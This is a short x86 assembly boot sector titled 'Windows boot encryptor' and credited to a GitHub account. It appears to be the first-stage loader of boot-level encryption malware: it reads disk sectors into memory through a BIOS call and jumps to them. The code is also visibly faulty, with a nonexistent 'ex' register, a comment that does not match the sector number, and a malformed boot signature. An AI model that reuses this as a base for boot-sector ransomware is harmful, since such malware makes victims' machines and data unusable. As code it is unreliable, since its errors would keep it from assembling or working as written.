;;Windows boot encryptor
;;https://github.com/DarxiSR

BITS 16
org 0x7c00

mov ax, cx
cli
mov ex, ax
mov ds, ax
mov ss, ax
mov fs, ax
mov gs, ax
sti

jmp loadingEnc

loadingEnc:
    mov bx, 0x1000
    mov es, bx             
    mov bx, 0              
        
    mov ah, 0x02           
    mov al, 2              
    mov dh, 0              
    mov ch, 0              
    mov cl, 4              ;SetFilePointer(third sector of hard drive);
    int 0x13               
    jc loadingEnc    
                               
    mov ax, 0x1000         ;[RAM address]
    mov ds, ax             ;Set DS = 0x1000
    mov es, ax             ;Set ES = 0x1000
    mov fs, ax             ;Set FS = 0x1000
    mov gs, ax             ;Set GS = 0x1000
    mov ss, ax             ;Set SS = 0x1000

    jmp 0x1000:0

times 510-($-$$) db 0
dw 0xAA55s